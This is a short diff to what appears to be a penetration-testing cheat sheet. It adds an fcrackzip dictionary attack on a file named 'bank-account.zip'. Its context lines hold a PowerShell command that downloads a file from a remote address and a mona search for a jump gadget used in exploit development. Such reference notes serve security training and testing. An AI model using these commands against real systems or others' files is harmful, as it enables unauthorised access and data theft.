@@ -183,6 +183,10 @@ powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$
 !mona find -s "\xFF\xE4" -m moduleName
 ```
 
+#### Cracking a ZIP Password
+```bash 
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
+```
 
 #### Setting up Simple HTTP server
 ```bash
